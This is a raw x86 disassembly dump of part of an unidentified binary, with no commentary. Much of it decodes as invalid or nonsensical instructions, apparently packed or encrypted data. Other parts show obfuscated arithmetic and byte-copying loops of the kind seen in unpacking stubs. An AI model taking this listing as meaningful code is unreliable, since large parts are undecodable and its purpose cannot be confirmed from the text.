  41b934:	ror    DWORD PTR [edx-0x48],1
  41b937:	shl    BYTE PTR [edi+0xf2f7487],cl
  41b93d:	jle    0x41b9b1
  41b93f:	test   esi,0x44a646c7
  41b945:	and    ebx,DWORD PTR [edi]
  41b947:	sub    bh,ah
  41b949:	out    0x19,eax
  41b94b:	sbb    al,0x32
  41b94d:	add    bl,BYTE PTR [esi-0x31]
  41b950:	dec    edi
  41b951:	xchg   edi,esp
  41b953:	or     BYTE PTR [ecx+0x45],bl
  41b956:	bound  esp,QWORD PTR [ebx+0x66]
  41b959:	sub    esp,DWORD PTR [ebp+0x51d07927]
  41b95f:	in     eax,dx
  41b960:	hlt    
  41b961:	mov    WORD PTR [ecx],ss
  41b963:	jl     0x41b9ab
  41b965:	add    DWORD PTR [ebp*4+0x6d60dfdc],ebx
  41b96c:	out    0xc8,al
  41b96e:	mov    esi,0x5d3b950c
  41b973:	pop    ds
  41b974:	(bad)  
  41b975:	push   esp
  41b976:	pop    ecx
  41b977:	push   es
  41b978:	retf   
  41b979:	xchg   BYTE PTR [eax],al
  41b97b:	jno    0x41b954
  41b97d:	sbb    esi,DWORD PTR [eax+ecx*1]
  41b980:	xchg   ebx,ebx
  41b982:	fsubr  DWORD PTR [ebp+0x5d]
  41b985:	sub    cl,cl
  41b987:	inc    eax
  41b988:	cs jns 0x41b9a4
  41b98b:	cmc    
  41b98c:	ds (bad) 
  41b98e:	ds dec edi
  41b990:	jecxz  0x41b9ea
  41b992:	sub    eax,0xf80ed54a
  41b997:	add    eax,0x6ce323b1
  41b99c:	jmp    0x5f43e54f
  41b9a1:	into   
  41b9a2:	es push cs
  41b9a4:	push   0x44
  41b9a6:	popf   
  41b9a7:	outs   dx,DWORD PTR ds:[esi]
  41b9a8:	jae    0x41b9d7
  41b9aa:	cli    
  41b9ab:	or     al,BYTE PTR [ebx-0x5e14ed00]
  41b9b1:	inc    ecx
  41b9b2:	nop
  41b9b3:	pop    es
  41b9b4:	sbb    DWORD PTR [edi+0x76757825],0xffffff92
  41b9bb:	dec    edx
  41b9bc:	bound  ebx,QWORD PTR [ecx-0x26]
  41b9bf:	test   eax,0x7a0e9cd3
  41b9c4:	dec    eax
  41b9c5:	xchg   esi,eax
  41b9c6:	jmp    0x8e279ceb
  41b9cb:	add    BYTE PTR [edx],al
  41b9cd:	jle    0x41b95a
  41b9cf:	xchg   edx,eax
  41b9d0:	jl     0x41b95f
  41b9d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9d3:	ins    BYTE PTR es:[edi],dx
  41b9d4:	xor    al,0xf
  41b9d6:	cmp    eax,0xb7685f99
  41b9db:	paddb  mm1,QWORD PTR [esi-0x61]
  41b9df:	fwait
  41b9e0:	jo     0x41b986
  41b9e2:	sahf   
  41b9e3:	sub    eax,0x5872465f
  41b9e8:	add    bh,BYTE PTR [edx+0x9]
  41b9eb:	add    DWORD PTR ds:0x2fe46ede,esi
  41b9f1:	sbb    esp,esp
  41b9f3:	inc    esp
  41b9f4:	cdq    
  41b9f5:	mov    eax,0xf12ce114
  41b9fa:	xchg   esp,eax
  41b9fb:	ror    BYTE PTR [esp+ebp*2+0x1],0x45
  41ba00:	add    dl,bl
  41ba02:	sub    BYTE PTR [ebp-0xe],ah
  41ba05:	cmp    ebp,DWORD PTR [edi+0x2d3c2df6]
  41ba0b:	(bad)  
  41ba0c:	pop    esi
  41ba0d:	dec    edi
  41ba0e:	sbb    edx,edx
  41ba10:	adc    al,BYTE PTR [esi]
  41ba12:	cmp    BYTE PTR [ebp-0x32d15134],dl
  41ba18:	sbb    eax,0xdd4d85f5
  41ba1d:	pop    es
  41ba1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba1f:	fstp   DWORD PTR [ebx-0x7e27b275]
  41ba25:	adc    eax,0x422976
  41ba2a:	xchg   esi,eax
  41ba2b:	sub    DWORD PTR [edx+0x0],eax
  41ba2e:	mov    esi,DWORD PTR [ebp-0x24]
  41ba31:	xor    eax,0x2340
  41ba36:	and    eax,ecx
  41ba38:	sbb    DWORD PTR ds:0x4228f6,0x422972
  41ba42:	xor    edx,0x452
  41ba48:	and    edx,esi
  41ba4a:	cmp    DWORD PTR ds:0x42298a,0x0
  41ba51:	mov    esi,DWORD PTR ds:0x4228da
  41ba57:	mov    esi,0x28ad
  41ba5c:	jmp    0x41ba97
  41ba61:	mov    DWORD PTR ds:0x422952,0x4940
  41ba6b:	ja     0x41ba89
  41ba71:	push   DWORD PTR [ebp-0x24]
  41ba74:	push   DWORD PTR [ebp-0x28]
  41ba77:	call   DWORD PTR ds:0x42a17c
  41ba7d:	sub    ecx,DWORD PTR ds:0x4228fa
  41ba83:	xor    DWORD PTR ds:0x4228ee,edi
  41ba89:	adc    DWORD PTR ds:0x4228fa,0x422972
  41ba93:	and    ecx,esi
  41ba95:	adc    ecx,esi
  41ba97:	and    eax,0x3741
  41ba9c:	mov    DWORD PTR [ebp-0x10],eax
  41ba9f:	and    edx,0x445b
  41baa5:	cmp    DWORD PTR ds:0x4229b6,0x0
  41baac:	mov    ecx,DWORD PTR ds:0x42293e
  41bab2:	mov    DWORD PTR ds:0x4229ce,ebx
  41bab8:	mov    esi,0x2c04
  41babd:	jmp    0x41bb16
  41bac2:	mov    DWORD PTR ds:0x42293a,edi
  41bac8:	jle    0x41bafe
  41bace:	push   0x3ca9
  41bad3:	call   DWORD PTR ds:0x42a058
  41bad9:	movzx  esi,WORD PTR ds:0x4228b2
  41bae0:	sbb    esi,DWORD PTR ds:0x4228fa
  41bae6:	mov    DWORD PTR ds:0x4228b2,esi
  41baec:	and    DWORD PTR ds:0x4228b2,0x689
  41baf6:	sub    ecx,esi
  41baf8:	sbb    DWORD PTR ds:0x4228de,edi
  41bafe:	sbb    DWORD PTR ds:0x4228f2,ecx
  41bb04:	mov    ecx,DWORD PTR ds:0x42295e
  41bb0a:	or     DWORD PTR ds:0x4228fe,ecx
  41bb10:	add    DWORD PTR ds:0x422992,ecx
  41bb16:	mov    DWORD PTR [ebp-0xc],edx
  41bb19:	mov    DWORD PTR [ebp-0x20],0x5770
  41bb20:	mov    eax,ds:0x422a7a
  41bb25:	mov    ecx,DWORD PTR ds:0x422b0e
  41bb2b:	sub    eax,ecx
  41bb2d:	and    eax,DWORD PTR [eax+ecx*1]
  41bb30:	mov    DWORD PTR [ebp-0x1c],0x18fc
  41bb37:	jmp    0x41bd75
  41bb3c:	mov    dh,0xdf
  41bb3e:	or     DWORD PTR [ecx-0x48],edx
  41bb41:	and    BYTE PTR [esi],ch
  41bb43:	pop    eax
  41bb44:	(bad)
  41bb48:	fsub   QWORD PTR [ecx+0x5dcae70]
  41bb4e:	or     al,0x16
  41bb50:	aad    0xa
  41bb52:	push   ss
  41bb53:	push   ss
  41bb54:	and    BYTE PTR [edi],dh
  41bb56:	mov    edx,0x85c97b37
  41bb5b:	aaa    
  41bb5c:	sbb    dh,bl
  41bb5e:	push   0x9bb3b624
  41bb63:	pop    esp
  41bb64:	(bad)  
  41bb66:	xchg   BYTE PTR [edi],al
  41bb68:	sub    BYTE PTR [esi-0x4dedd951],dh
  41bb6e:	ds pop ebx
  41bb70:	dec    esp
  41bb71:	ret    
  41bb72:	test   BYTE PTR [ebp+0xb],dh
  41bb75:	jo     0x41bb7f
  41bb77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb78:	or     BYTE PTR [ecx],cl
  41bb7a:	jbe    0x41bb55
  41bb7c:	jp     0x41bbe2
  41bb7e:	lea    esp,[ebx+0x67047cde]
  41bb84:	mov    eax,0x919cc1a
  41bb89:	cmp    BYTE PTR [esi+0x521513af],dl
  41bb8f:	enter  0xbd2d,0xa2
  41bb93:	pop    eax
  41bb94:	pop    edx
  41bb95:	sbb    BYTE PTR [edx-0x29],ch
  41bb98:	mov    ch,0x7
  41bb9a:	xchg   edi,eax
  41bb9b:	outs   dx,BYTE PTR ds:[esi]
  41bb9c:	xchg   ecx,eax
  41bb9d:	fmul   QWORD PTR [ebx-0x4149a388]
  41bba3:	aam    0xae
  41bba5:	and    al,0xb0
  41bba7:	pop    edi
  41bba8:	sbb    DWORD PTR [ecx-0x6307f1bf],ebx
  41bbae:	sbb    eax,0x7a027c8b
  41bbb3:	hlt    
  41bbb4:	loopne 0x41bbdb
  41bbb6:	(bad)  
  41bbb7:	sub    eax,0xf54fff65
  41bbbc:	xlat   BYTE PTR ds:[ebx]
  41bbbd:	in     al,dx
  41bbbe:	cmp    DWORD PTR [edi],eax
  41bbc0:	fdivr  QWORD PTR [ebp+0x52]
  41bbc3:	jne    0x41bbff
  41bbc5:	addr16 dec eax
  41bbc7:	neg    al
  41bbc9:	adc    DWORD PTR [ebx+edi*1-0x4eee5cb2],edi
  41bbd0:	pusha  
  41bbd1:	xor    ch,al
  41bbd3:	mov    ?,WORD PTR [ebx+0x3a39dd78]
  41bbd9:	es xor al,0x50
  41bbdc:	xchg   edi,eax
  41bbdd:	add    bl,bl
  41bbdf:	in     eax,0x6e
  41bbe1:	lods   al,BYTE PTR ds:[esi]
  41bbe2:	pop    esp
  41bbe3:	and    al,BYTE PTR [esi-0x58]
  41bbe6:	stos   DWORD PTR es:[edi],eax
  41bbe7:	sub    al,0x48
  41bbe9:	cmp    ecx,DWORD PTR ss:[ebx-0x22]
  41bbed:	das    
  41bbee:	xchg   ebx,eax
  41bbef:	cs inc ecx
  41bbf1:	daa    
  41bbf2:	jle    0x41bbf9
  41bbf4:	inc    esp
  41bbf5:	shr    DWORD PTR [esi+ebx*4+0x16],0x33
  41bbfa:	not    DWORD PTR [eax-0xc]
  41bbfd:	jge    0x41bc62
  41bbff:	out    dx,eax
  41bc00:	lock cld 
  41bc02:	cmp    al,0x26
  41bc04:	cld    
  41bc05:	pop    esi
  41bc06:	out    0x9,eax
  41bc08:	mov    cl,0x8
  41bc0a:	push   0x99bfc8b3
  41bc0f:	xor    al,0xd6
  41bc11:	xor    DWORD PTR [edi-0x3e],esi
  41bc14:	fsubp  st(3),st
  41bc16:	lock xchg edx,eax
  41bc18:	mov    ah,0xaf
  41bc1a:	inc    edi
  41bc1b:	jle    0x41bc91
  41bc1d:	jb     0x41bc59
  41bc1f:	in     eax,0xac
  41bc21:	and    esi,DWORD PTR [ebp+0x58]
  41bc24:	lock retf 
  41bc26:	scas   eax,DWORD PTR es:[edi]
  41bc27:	mov    bh,0x98
  41bc29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc2a:	xor    esp,DWORD PTR [edx-0x4]
  41bc2d:	jns    0x41bc13
  41bc2f:	sbb    edx,DWORD PTR [ecx]
  41bc31:	call   0x3255f6bd
  41bc36:	inc    esi
  41bc37:	or     DWORD PTR [ecx-0x79c4e4ff],esp
  41bc3d:	call   0xcc89:0x7c55e08f
  41bc44:	pop    ds
  41bc45:	iret   
  41bc46:	neg    DWORD PTR [ecx-0x80]
  41bc49:	dec    esp
  41bc4a:	fwait
  41bc4b:	sub    dh,ch
  41bc4d:	jl     0x41bbf5
  41bc4f:	xor    dl,bl
  41bc51:	das    
  41bc52:	in     al,dx
  41bc53:	retf   0xebe
  41bc56:	cmc    
  41bc57:	inc    ecx
  41bc58:	icebp  
  41bc59:	retf   0x482b
  41bc5c:	and    eax,0xbb03505a
  41bc61:	scas   al,BYTE PTR es:[edi]
  41bc62:	jo     0x41bc38
  41bc64:	jno    0x41bc41
  41bc66:	jne    0x41bc1f
  41bc68:	sbb    BYTE PTR [esi-0x41],dh
  41bc6b:	mov    bh,0x75
  41bc6d:	imul   esp,DWORD PTR [eax],0x59452846
  41bc73:	or     BYTE PTR [eax+0x6a8044b1],ah
  41bc79:	mov    ah,0xe7
  41bc7b:	xchg   edi,eax
  41bc7c:	(bad)  
  41bc7d:	loopne 0x41bc32
  41bc7f:	and    al,0x1f
  41bc81:	fcomp  DWORD PTR [eax]
  41bc83:	repz repnz mov cl,0x8e
  41bc87:	inc    ebp
  41bc88:	popf   
  41bc89:	shl    DWORD PTR [ebx+edi*2+0x8],0x5f
  41bc8e:	push   ebx
  41bc8f:	or     al,BYTE PTR ds:0x666df874
  41bc95:	fnstcw WORD PTR [edx+0x56]
  41bc98:	jle    0xf474c599
  41bc9e:	sub    DWORD PTR [ecx],eax
  41bca0:	add    esi,DWORD PTR [ecx]
  41bca2:	js     0x41bce5
  41bca4:	int    0x26
  41bca6:	fld    DWORD PTR [edx-0x3f]
  41bca9:	jo     0x41bc81
  41bcab:	xchg   edx,eax
  41bcac:	loope  0x41bc48
  41bcae:	sbb    eax,0xaba0aff8
  41bcb3:	pushf  
  41bcb4:	jge    0x41bc58
  41bcb6:	out    0x75,al
  41bcb8:	dec    ecx
  41bcb9:	mov    eax,0x75c8bd4d
  41bcbe:	push   ecx
  41bcbf:	mov    al,0xdd
  41bcc1:	dec    esp
  41bcc2:	xor    edx,DWORD PTR [ebx-0x6f]
  41bcc5:	fisubr WORD PTR [ebp+eax*2-0x35]
  41bcc9:	add    bh,BYTE PTR [eax-0x51262c33]
  41bccf:	bndldx (bad),[edi+0x5b95de7c]
  41bcd6:	mov    edi,esi
  41bcd8:	jmp    0x7d8b2c7c
  41bcdd:	nop
  41bcde:	xchg   esi,eax
  41bcdf:	push   0xffffffc8
  41bce1:	jmp    0xbc19dcc7
  41bce6:	jb     0x41bd51
  41bce8:	sub    eax,0x7c06386a
  41bced:	ss jg  0x41bd4a
  41bcf0:	out    dx,al
  41bcf1:	lea    ecx,[ecx-0x11a3d813]
  41bcf7:	mov    WORD PTR [eax-0x4c355bd9],?
  41bcfd:	lods   eax,DWORD PTR ds:[esi]
  41bcfe:	mov    esp,0x6556bb97
  41bd03:	test   dl,ah
  41bd05:	and    al,0x2a
  41bd07:	cmp    DWORD PTR [esi],ebp
  41bd09:	add    ebx,ecx
  41bd0b:	mov    DWORD PTR [ebp-0x7],edi
  41bd0e:	mov    ds:0x3bfe3fbc,eax
  41bd13:	leave  
  41bd14:	mov    ss,WORD PTR [ebp+0x1a]
  41bd17:	pop    ds
  41bd18:	jmp    0x6daa7210
  41bd1d:	jge    0x41bca0
  41bd1f:	mov    ds:0x78ee68ef,al
  41bd24:	sub    bl,BYTE PTR [ebx+edx*1-0x369dbbca]
  41bd2b:	dec    edi
  41bd2c:	pop    eax
  41bd2d:	in     al,0x54
  41bd2f:	fwait
  41bd30:	js     0x41bcd8
  41bd32:	rcr    al,cl
  41bd34:	je     0x41bcc3
  41bd36:	cld    
  41bd37:	xor    BYTE PTR es:[eax-0xbb748b3],dh
  41bd3e:	ss call 0x5b86c94a
  41bd44:	push   DWORD PTR [edx]
  41bd46:	add    al,0xb2
  41bd48:	into   
  41bd49:	(bad)  
  41bd4a:	retf   
  41bd4b:	stos   DWORD PTR es:[edi],eax
  41bd4c:	adc    al,0xb8
  41bd4e:	aaa    
  41bd4f:	mov    eax,0x1fbbe92b
  41bd54:	pop    ebp
  41bd55:	nop
  41bd56:	adc    edx,esi
  41bd58:	push   cs
  41bd59:	pop    ds
  41bd5a:	dec    eax
  41bd5b:	(bad)  
  41bd5c:	cmp    cl,BYTE PTR [eax+0x75]
  41bd5f:	and    ch,BYTE PTR [edx+0x1b]
  41bd62:	dec    ecx
  41bd63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd64:	xchg   edx,eax
  41bd65:	loopne 0x41bd9e
  41bd67:	and    eax,0x9d79769
  41bd6c:	mov    eax,0xeb09a567
  41bd71:	addr16 jno 0x41bd2e
  41bd74:	mov    dh,0xc7
  41bd76:	inc    ebp
  41bd77:	fcomp  DWORD PTR [ebx]
  41bd79:	adc    eax,0xca130000
  41bd7e:	mov    DWORD PTR [ebp-0x24],0x1c21
  41bd85:	add    DWORD PTR ds:0x42293a,0x7032
  41bd8f:	mov    eax,DWORD PTR [ebp-0x28]
  41bd92:	mov    DWORD PTR ds:0x4228d6,0x3603
  41bd9c:	mov    ecx,DWORD PTR [ebp-0x24]
  41bd9f:	xor    edx,DWORD PTR ds:0x42295a
  41bda5:	mov    edx,DWORD PTR [ebp-0x20]
  41bda8:	and    esi,DWORD PTR ds:0x422932
  41bdae:	mov    esi,DWORD PTR [ebp-0x1c]
  41bdb1:	add    eax,0x12fa
  41bdb6:	push   esi
  41bdb7:	adc    ecx,0x31c
  41bdbd:	sbb    DWORD PTR ds:0x422992,0x422932
  41bdc7:	push   edx
  41bdc8:	neg    DWORD PTR ds:0x4228ae
  41bdce:	and    ecx,0x2420
  41bdd4:	or     DWORD PTR ds:0x422896,0x6744
  41bdde:	and    eax,0x7f7f
  41bde3:	sub    DWORD PTR ds:0x42292e,0x4229a6
  41bded:	push   ecx
  41bdee:	push   eax
  41bdef:	or     DWORD PTR ds:0x422932,0x422986
  41bdf9:	call   0x41dfb1
  41bdfe:	mov    DWORD PTR ds:0x4228d2,0x50ed
  41be08:	mov    esi,DWORD PTR [ebp-0x10]
  41be0b:	mov    ecx,0x61bf
  41be10:	mov    ecx,DWORD PTR [ebp-0xc]
  41be13:	cmp    ecx,edx
  41be15:	ja     0x41c168
  41be1b:	mov    DWORD PTR ds:0x4229aa,0x308e
  41be25:	jb     0x41be3d
  41be2b:	cmp    esi,eax
  41be2d:	mov    DWORD PTR ds:0x4228d2,0x64bb
  41be37:	jae    0x41c168
  41be3d:	adc    ecx,DWORD PTR ds:0x4229ce
  41be43:	mov    DWORD PTR [ebp-0x10],0x6155
  41be4a:	mov    DWORD PTR [ebp-0xc],0x201
  41be51:	sub    ecx,DWORD PTR ds:0x4228be
  41be57:	mov    DWORD PTR [ebp-0x20],0x44e0
  41be5e:	cmp    DWORD PTR ds:0x4228ca,0x0
  41be65:	mov    edx,0x767c
  41be6a:	not    esi
  41be6c:	jmp    0x41bed9
  41be71:	not    edx
  41be73:	jbe    0x41beb4
  41be79:	push   DWORD PTR [ebp-0x18]
  41be7c:	push   0x8f12
  41be81:	push   DWORD PTR [ebp-0x28]
  41be84:	push   0x243c
  41be89:	push   0x73f8
  41be8e:	push   0x4227d9
  41be93:	push   0x400000
  41be98:	call   DWORD PTR ds:0x42a030
  41be9e:	sub    DWORD PTR ds:0x4228be,ebx
  41bea4:	sub    ecx,DWORD PTR ds:0x422986
  41beaa:	sbb    DWORD PTR ds:0x42292e,0x3fb0
  41beb4:	xor    DWORD PTR ds:0x4229c6,0x7a44
  41bebe:	add    DWORD PTR ds:0x4228de,0x618
  41bec8:	mov    edx,DWORD PTR ds:0x422aba
  41bece:	mov    esi,DWORD PTR ds:0x422b16
  41bed4:	sub    esi,edx
  41bed6:	add    edx,DWORD PTR [edx+esi*1]
  41bed9:	mov    DWORD PTR [ebp-0x1c],0x5ee2
  41bee0:	xor    eax,0x576f
  41bee5:	mov    DWORD PTR [ebp-0x28],0x1aff
  41beec:	mov    DWORD PTR [ebp-0x24],0xee6
  41bef3:	mov    eax,DWORD PTR [ebp-0x28]
  41bef6:	cmp    DWORD PTR ds:0x422982,0x0
  41befd:	mov    DWORD PTR ds:0x42292e,0x189d
  41bf07:	mov    DWORD PTR ds:0x4229c6,edx
  41bf0d:	jmp    0x41bf57
  41bf12:	mov    DWORD PTR ds:0x4229d2,ebx
  41bf18:	mov    DWORD PTR ds:0x42294e,edx
  41bf1e:	jl     0x41bf3b
  41bf24:	push   0x3bbb
  41bf29:	call   DWORD PTR ds:0x42a034
  41bf2f:	sub    ecx,DWORD PTR ds:0x42293a
  41bf35:	sbb    DWORD PTR ds:0x4229b2,ebx
  41bf3b:	or     ecx,DWORD PTR ds:0x4229be
  41bf41:	and    DWORD PTR ds:0x4228ea,0x3818
  41bf4b:	sbb    DWORD PTR ds:0x42296e,0x49eb
  41bf55:	adc    ecx,ecx
  41bf57:	mov    ecx,DWORD PTR [ebp-0x24]
  41bf5a:	mov    edx,DWORD PTR [ebp-0x20]
  41bf5d:	mov    esi,DWORD PTR [ebp-0x1c]
  41bf60:	add    eax,edx
  41bf62:	mov    edx,DWORD PTR [ebp-0x10]
  41bf65:	adc    ecx,esi
  41bf67:	mov    esi,DWORD PTR [ebp-0xc]
  41bf6a:	or     ecx,0x142d
  41bf70:	or     eax,0x26da
  41bf75:	add    eax,0x4b35
  41bf7a:	adc    ecx,0x509e
  41bf80:	xor    eax,edx
  41bf82:	xor    ecx,esi
  41bf84:	add    eax,0x5ec6
  41bf89:	mov    DWORD PTR [ebp-0x40],eax
  41bf8c:	adc    ecx,0x3421
  41bf92:	mov    DWORD PTR [ebp-0x3c],ecx
  41bf95:	mov    DWORD PTR [ebp-0x38],0x4edc
  41bf9c:	mov    DWORD PTR [ebp-0x34],0x733f
  41bfa3:	mov    DWORD PTR [ebp-0x30],0x58e
  41bfaa:	mov    DWORD PTR [ebp-0x2c],0x43b2
  41bfb1:	mov    DWORD PTR [ebp-0x10],0x69531b9
  41bfb8:	mov    DWORD PTR [ebp-0xc],0x0
  41bfbf:	mov    DWORD PTR [ebp-0x20],0x55d
  41bfc6:	mov    DWORD PTR [ebp-0x1c],0xa30
  41bfcd:	mov    DWORD PTR [ebp-0x28],0x1f62
  41bfd4:	mov    DWORD PTR [ebp-0x24],0x677b
  41bfdb:	mov    eax,DWORD PTR [ebp-0x28]
  41bfde:	mov    ecx,DWORD PTR [ebp-0x24]
  41bfe1:	mov    edx,DWORD PTR [ebp-0x20]
  41bfe4:	mov    esi,DWORD PTR [ebp-0x1c]
  41bfe7:	and    eax,edx
  41bfe9:	mov    edx,DWORD PTR [ebp-0x10]
  41bfec:	and    ecx,esi
  41bfee:	mov    esi,DWORD PTR [ebp-0xc]
  41bff1:	push   esi
  41bff2:	push   edx
  41bff3:	push   ecx
  41bff4:	push   eax
  41bff5:	call   0x421af6
  41bffa:	push   0x353c
  41bfff:	push   0x45cf
  41c004:	push   edx
  41c005:	push   eax
  41c006:	call   0x41dfb1
  41c00b:	mov    ecx,DWORD PTR [ebp-0x30]
  41c00e:	mov    esi,DWORD PTR [ebp-0x2c]
  41c011:	add    eax,ecx
  41c013:	mov    ecx,DWORD PTR [ebp-0x38]
  41c016:	adc    edx,esi
  41c018:	mov    esi,DWORD PTR [ebp-0x34]
  41c01b:	and    eax,ecx
  41c01d:	mov    ecx,DWORD PTR [ebp-0x40]
  41c020:	and    edx,esi
  41c022:	mov    esi,DWORD PTR [ebp-0x3c]
  41c025:	cmp    ecx,eax
  41c027:	jne    0x41c035
  41c02d:	cmp    esi,edx
  41c02f:	je     0x41c168
  41c035:	mov    DWORD PTR [ebp-0x40],0x5f3f50d6
  41c03c:	mov    DWORD PTR [ebp-0x3c],0x1
  41c043:	mov    eax,DWORD PTR [ebp-0x40]
  41c046:	mov    ecx,DWORD PTR [ebp-0x3c]
  41c049:	push   ecx
  41c04a:	push   eax
  41c04b:	push   0x7850
  41c050:	push   0x5329
  41c055:	call   0x421af6
  41c05a:	xor    eax,0x100
  41c05f:	xor    edx,0x201
  41c065:	or     eax,0x76ef
  41c06a:	or     edx,0x5df4
  41c070:	mov    DWORD PTR [ebp-0x40],eax
  41c073:	mov    DWORD PTR [ebp-0x3c],edx
  41c076:	mov    eax,ds:0x42247c
  41c07b:	cmp    eax,0x7cd80819
  41c080:	jne    0x41c168
  41c086:	mov    eax,DWORD PTR [ebp-0x18]
  41c089:	mov    ecx,DWORD PTR [ebp-0x14]
  41c08c:	mov    edx,DWORD PTR [ebp-0x18]
  41c08f:	mov    esi,DWORD PTR [ebp-0x14]
  41c092:	shrd   eax,ecx,0x2
  41c096:	shl    edx,0x1e
  41c099:	mov    edx,DWORD PTR ds:0x422268
  41c09f:	mov    edx,DWORD PTR [edx+0x1a8]
  41c0a5:	xor    esi,esi
  41c0a7:	shr    ecx,0x2
  41c0aa:	mov    ecx,0x2e9a655c
  41c0af:	xor    eax,ecx
  41c0b1:	or     eax,esi
  41c0b3:	mov    DWORD PTR [edx],eax
  41c0b5:	mov    eax,DWORD PTR [ebp-0x18]
  41c0b8:	mov    edx,DWORD PTR [ebp-0x14]
  41c0bb:	shrd   eax,edx,0x2
  41c0bf:	shr    edx,0x2
  41c0c2:	mov    edx,DWORD PTR [ebp-0x18]
  41c0c5:	mov    esi,DWORD PTR [ebp-0x14]
  41c0c8:	xor    eax,ecx
  41c0ca:	xor    esi,esi
  41c0cc:	or     eax,esi
  41c0ce:	mov    ds:0x42247c,eax
  41c0d3:	mov    BYTE PTR [ebp-0x6],0x87
  41c0d7:	mov    BYTE PTR [ebp-0x5],0x12
  41c0db:	mov    BYTE PTR [ebp-0x4],0x2
  41c0df:	mov    BYTE PTR [ebp-0x3],0x93
  41c0e3:	mov    BYTE PTR [ebp-0x2],0x23
  41c0e7:	mov    BYTE PTR [ebp-0x1],0x2
  41c0eb:	mov    al,BYTE PTR [ebp-0x1]
  41c0ee:	movzx  esi,al
  41c0f1:	mov    al,BYTE PTR [ebp-0x2]
  41c0f4:	movzx  eax,al
  41c0f7:	shl    edx,0x1e
  41c0fa:	cdq    
  41c0fb:	idiv   esi
  41c0fd:	mov    dl,BYTE PTR [ebp-0x3]
  41c100:	movzx  edx,dl
  41c103:	movzx  eax,al
  41c106:	or     eax,edx
  41c108:	mov    dl,BYTE PTR [ebp-0x4]
  41c10b:	movzx  esi,dl
  41c10e:	cdq    
  41c10f:	idiv   esi
  41c111:	mov    dl,BYTE PTR [ebp-0x5]
  41c114:	movzx  esi,dl
  41c117:	movzx  eax,al
  41c11a:	cdq    
  41c11b:	idiv   esi
  41c11d:	movzx  edx,BYTE PTR [ebp-0x6]
  41c121:	and    eax,edx
  41c123:	mov    BYTE PTR [ebp-0x4],al
  41c126:	mov    BYTE PTR [ebp-0x5],0x66
  41c12a:	mov    BYTE PTR [ebp-0x6],0xcb
  41c12e:	mov    al,BYTE PTR [ebp-0x6]
  41c131:	mov    dl,BYTE PTR [ebp-0x5]
  41c134:	add    al,dl
  41c136:	add    al,0x48
  41c138:	mov    dl,0xe8
  41c13a:	imul   dl
  41c13c:	mov    dl,BYTE PTR [ebp-0x4]
  41c13f:	cmp    dl,al
  41c141:	ja     0x41c168
  41c147:	mov    eax,DWORD PTR [ebp-0x18]
  41c14a:	mov    edx,DWORD PTR [ebp-0x14]
  41c14d:	shrd   eax,edx,0x2
  41c151:	xor    eax,ecx
  41c153:	mov    ecx,DWORD PTR [ebp-0x18]
  41c156:	shr    edx,0x2
  41c159:	mov    edx,DWORD PTR [ebp-0x14]
  41c15c:	xor    edx,edx
  41c15e:	shl    ecx,0x1e
  41c161:	or     eax,edx
  41c163:	mov    ds:0x422370,eax
  41c168:	pop    esi
  41c169:	leave  
  41c16a:	ret    
  41c16b:	push   ebp
  41c16c:	mov    ebp,esp
  41c16e:	sub    esp,0x28
  41c171:	push   ebx
  41c172:	push   esi
  41c173:	push   edi
  41c174:	mov    DWORD PTR [ebp-0x10],0x67e2
  41c17b:	mov    DWORD PTR [ebp-0x4],0x4726
  41c182:	mov    DWORD PTR [ebp-0x8],0x580
  41c189:	mov    DWORD PTR [ebp-0xc],0x5f3e
  41c190:	mov    DWORD PTR [ebp-0x28],0x3294
  41c197:	mov    DWORD PTR [ebp-0x24],0x643
  41c19e:	mov    DWORD PTR [ebp-0x20],0x2545
  41c1a5:	mov    DWORD PTR [ebp-0x1c],0x43ab
  41c1ac:	xor    ebx,ebx
  41c1ae:	inc    ebx
  41c1af:	mov    DWORD PTR [ebp-0x18],ebx
  41c1b2:	mov    DWORD PTR [ebp-0x14],0x76b1
  41c1b9:	mov    ecx,DWORD PTR [ebp-0x8]
  41c1bc:	mov    eax,DWORD PTR [ebp-0x4]
  41c1bf:	sub    ecx,eax
  41c1c1:	add    ecx,DWORD PTR [ebp-0xc]
  41c1c4:	add    ecx,DWORD PTR [ebp-0x10]
  41c1c7:	imul   ecx,ecx,0x1f80
  41c1cd:	add    ecx,0x727e
  41c1d3:	xor    ecx,0x106c92f2
  41c1d9:	mov    DWORD PTR [ebp-0x8],0x113c
  41c1e0:	mov    DWORD PTR [ebp-0xc],0x3d61
  41c1e7:	mov    DWORD PTR [ebp-0x10],0x16e9
  41c1ee:	mov    DWORD PTR [ebp-0x4],0x21aa
  41c1f5:	mov    eax,DWORD PTR [ebp-0x10]
  41c1f8:	or     eax,0x3611
  41c1fd:	add    eax,DWORD PTR [ebp-0xc]
  41c200:	mov    edx,DWORD PTR [ebp-0x8]
  41c203:	and    eax,edx
  41c205:	mov    edx,ecx
  41c207:	sub    edx,eax
  41c209:	mov    eax,DWORD PTR [ebp-0x4]
  41c20c:	mov    esi,DWORD PTR ds:0x422268
  41c212:	mov    esi,DWORD PTR [esi+0x1cc]
  41c218:	add    eax,0x6772
  41c21d:	or     eax,0x1f24
  41c222:	sub    eax,0x7046
  41c227:	xor    eax,0x497a
  41c22c:	sub    esi,eax
  41c22e:	mov    eax,DWORD PTR [ebp+0x8]
  41c231:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  41c238:	mov    BYTE PTR [esi+ecx*1],al
  41c23b:	mov    eax,DWORD PTR [ebp-0x14]
  41c23e:	mov    esi,DWORD PTR [ebp-0x18]
  41c241:	and    eax,0x2389
  41c246:	xor    eax,0x695
  41c24b:	xor    edx,edx
  41c24d:	div    esi
  41c24f:	lea    ecx,[ecx+eax*1-0x2413]
  41c256:	mov    eax,DWORD PTR [ebp-0x1c]
  41c259:	add    eax,DWORD PTR [ebp-0x20]
  41c25c:	mov    edx,DWORD PTR [ebp-0x24]
  41c25f:	and    eax,edx
  41c261:	mov    edx,DWORD PTR [ebp-0x28]
  41c264:	imul   eax,edx
  41c267:	mov    edx,0xd0c8f
  41c26c:	sub    edx,eax
  41c26e:	cmp    ecx,edx
  41c270:	jbe    0x41c1d9
  41c276:	push   0x2
  41c278:	pop    eax
  41c279:	mov    DWORD PTR [ebp-0x1c],eax
